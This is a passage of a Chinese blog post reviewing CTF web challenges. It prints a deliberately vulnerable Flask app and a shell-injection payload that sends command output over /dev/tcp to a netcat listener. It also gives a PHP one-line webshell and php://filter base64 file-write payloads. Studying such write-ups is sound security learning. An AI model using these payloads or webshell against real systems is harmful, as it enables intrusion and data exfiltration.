+<p><a class="link"   target="_blank" rel="noopener" href="http://c.biancheng.net/view/6137.html" >php单双引号的不同 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wbw-test/p/11737683.html" >Python利用request包发送post请求 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>代码审计、黑名单绕过加shell注入</p>
+<p>app源码:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):		<span class="comment">#防火墙~</span></span><br><span class="line">    <span class="comment">#黑名单，过滤的是空格不是换行符！</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():	<span class="comment">#全部转换成小写后比较黑名单</span></span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)	<span class="comment">#相当于echo time ip num&gt; ./tmp/log.txt</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)	<span class="comment">#将num字符串中的内容当python语句执行</span></span><br><span class="line">            os.system(log)		<span class="comment">#将log字串的内容放到shell中执行</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure></div>
+
+<p>首先要让python不报错，这样<code>try:</code>才不会跳到<code>except：</code>，才会执行<code>os.system()</code>，由于被过滤了很多重要符号，想利用<code>eval()</code>几乎是不可能的，所以选择利用<code>os.system()</code>。留意到反引号，<code>$</code>，<code>#</code>都没有被过滤，在本地做如下测试：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165346212-187707827.png"
+                     
+                ></p>
+<p>说明payload：1#`id` 是不会导致python报错的，再测试:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165353606-537752174.png"
+                     
+                ></p>
+<p>说明反引号的内容是被shell有效执行了的（这里利用了shell的一些语法特点），观察源码，发现log的赋值语句具备这种注入条件<code>echo &#123;xxx&#125; &#123;xxx&#125; &#123;payload&#125;&gt; ./tmp/log.txt</code>，于是再次测试:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165403321-1565408337.png"
+                     
+                ></p>
+<p>注入成功！接下来就可以利用这一点反弹shell了。由于自己服务器防火墙原因我没能成功打出flag，但是弄懂了基本步骤如下:</p>
+<ol>
+<li>首先要有一台机子拥有公网ip(内网穿透或者注册服务器都行)，在该机子上监听特定端口:<code>nc -lvp 8081</code>。</li>
+<li>向目标服务器（题目的服务器）发送payload：1#`ls&gt;&#x2F;dev&#x2F;tcp&#x2F;{ip}&#x2F;8081` ，该语句意为向某ip的8081端口利用TCP协议发送本地命令<code>ls</code>的结果</li>
+<li>于是我的被发送的那台机子就会收到对应结果，就可以利用任意命令执行找出flag了。</li>
+</ol>
+<h4 id="3-27"><a href="#3-27" class="headerlink" title="3.27"></a>3.27</h4><p>开放服务器特定防火墙后本地ping通了！(腾讯云的ubuntu2007有效，但是cloudreve镜像就一直不成功)</p>
+<p>腾讯云上的ubuntu实例命令<code>nc -lvp xxxx</code>无效，只能<code>nc -lp xxxx</code>监听端口，随后输入payload:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#`ls&gt;/dev/tcp/IP/port</span><br></pre></td></tr></table></figure></div>
+
+<p>这里payload要经过URL编码，尤其是<code>#</code>可能会被当做定位符号</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%23%60ls%3E/dev/tcp/IP/port</span><br></pre></td></tr></table></figure></div>
+
+<p>将目录发到主机上，发现flag文件就在当前目录下，但名字中带有过滤字符无法直接打印，选择打印所有信息:<code>cat *</code>或者<code>cat ./*</code>，这里注意空格的URL编码可以也只能选择用<code>%09</code>(水平制表符)替代，其他空白字符都无效</p>
+<p>netcat监听端口后，<code>ctrl+c</code> 断开进程，<code>ctrl+z</code> 挂起进程，<code>ps -aux</code>可以显示当前所有进程，最右侧会显示命令内容，根据相应的<code>PID</code>，使用命令<code>kill -9 PID</code> 杀死相应进程即可关闭。可以使用<code>telnet IP port</code> 命令扫描目标端口，也可以使用nmap工具扫描: <code>nmap IP port</code>|Tips:<code>ctrl+]</code>表示<code>^]</code></p>
+<p><code>ipconfig</code>可以读取windows的IP地址。<code>ifconfig</code>可以读取linux的IP地址，但是需要下载netTools</p>
+<p><strong>参考:[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-shell.html" >Linux-Shell教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/hihtml5/p/9272751.html" >shell介绍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/chengmo/archive/2010/10/22/1858302.html" >Linux-shell脚本实现tcp&#x2F;upd协议通讯(重定向应用) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nmap/p/6148306.html" >nc命令用法举例 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h3 id="updgstore"><a href="#updgstore" class="headerlink" title="updgstore"></a>updgstore</h3><h4 id="php学习"><a href="#php学习" class="headerlink" title="php学习"></a>php学习</h4><p>下载phpstudy并完成基本配置后，将写好的php源码丢入网页源码所在文件夹”&#x2F;WWW”，再在本地网页中访问该php文件即可运行。</p>
+<p>一句话木马:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[shell]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>@是为了即使执行错误也不报错</p>
+<p>测试代码如下:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&quot;&lt;?php echo &#x27;CAN I GET FLAG?&#x27;; ?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$content</span>.=<span class="variable">$_GET</span>[<span class="string">&#x27;cst&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>输入payload <code>?cst=&lt;?php phpinfo(); ?&gt;&amp;filename=qwq.php</code> ，发现网页上只有一个1，查看源码，发现两串以字符串形式被返回的源码都被注释了。再访问当前目录下的”qwq.php”文件，发现回显了phpinfo</p>
+<p>尝试filter过滤协议写入base64编码，<strong>payload</strong>:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cst=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=qwq.php</span></span><br></pre></td></tr></table></figure></div>
+
+<p> 出现报错:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165426328-47703195.png"
+                     
+                ></p>
+<p>更换<strong>payload</strong>:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cst=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php:<span class="comment">//filter/write=convert.base64-encode/resource=qwq.php</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cst=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php:<span class="comment">//filter/write=string.toupper/resource=qwq.php</span></span><br></pre></td></tr></table></figure></div>
+
+<p>发现都能有效生成目标文件且无报错。</p>
+<p>其中cst的值为 <code>phpinfo()</code> 函数的base64编码版。尝试使用base64编码和转换为大写字符都没有问题，但是尝试将其解码为base64就出现报错，因为$content之前拼接了base64解码不出来的非法字符，所以最后会将目标文件置为空，那网上博客中的利用base64编码绕过一些限制的操作应该是无法成功的…</p>
+<p>经过一番测试发现是可以成功的。这里需要了解一下Base64的编码逻辑，在编码时它将三个字节的数据编码成四个字节，也就是说解码的时候字节数一定是四的整数倍，所以这个地方需要在payload中补齐长度。$content原有内容的长度为32，但是其中能被Base64识别的可解码字符只有18个，不可解码字符是不算在内的，所以所以我们需要至少补两个字节的内容（ASCLL编码下一个字符占用一个字节）,于是我们补齐两个”a”，得到<strong>payload:</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cst=aaPD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=qwq.php</span></span><br></pre></td></tr></table></figure></div>
+
+<p>qwq.php的内容:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?^r ?<span class="number">1</span>K f??php <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>会发现还是有问题，后半句话并没有完全解码成功，更换<strong>payload：</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cst=aaaaaaPD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=qwq.php</span></span><br></pre></td></tr></table></figure></div>
+
+<p>qwq.php的内容:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?^r ?<span class="number">1</span>K f歩<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这次成功了，多补齐一组多余字符将乱码与我们想要写入的内容隔离开来即可</p>
+<p>访问&#x2F;qwq.php能成功得到phpinfo的内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165439131-1694109796.png"
+                     
+                ></p>
+<p>然鹅这一切都被过滤了，本题用不了(悲)</p>
+<p><strong>参考:[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/believesoul/article/details/84100616" >Base64编码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35544379/article/details/78230629" >php的filter协议过滤 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765" >一句话木马 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/lengyuezuixue/article/details/88090552" >show_source()函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h2 id="英文手册："><a href="#英文手册：" class="headerlink" title="英文手册："></a><em>英文手册：</em></h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plugin:插件</span><br><span class="line">ether:以太</span><br><span class="line">contract:合同</span><br><span class="line">CVE-Common Vulnerabilities &amp; Exposures:通用漏洞披露</span><br><span class="line">exploit：开发</span><br><span class="line">proof:证明</span><br><span class="line">recursive:递归的</span><br></pre></td></tr></table></figure></div>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> CTF比赛复盘（二）</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2022-05-26 16:55:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2022-05-26 16:55:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2022/05/26/Security/CTF/CTF比赛复盘（二）/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">CTF比赛复盘（二）</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF"><span class="nav-text">*CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#oh-my-grafana"><span class="nav-text">oh-my-grafana</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BlockChain"><span class="nav-text">BlockChain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#treasure-hunters"><span class="nav-text">treasure-hunters</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MRCTF"><span class="nav-text">MRCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CheckIn"><span class="nav-text">CheckIn</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WebCheckIn"><span class="nav-text">WebCheckIn</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF"><span class="nav-text">DASCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-1"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezpop"><span class="nav-text">ezpop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#calc"><span class="nav-text">calc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updgstore"><span class="nav-text">updgstore</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8B%B1%E6%96%87%E6%89%8B%E5%86%8C%EF%BC%9A"><span class="nav-text">英文手册：</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
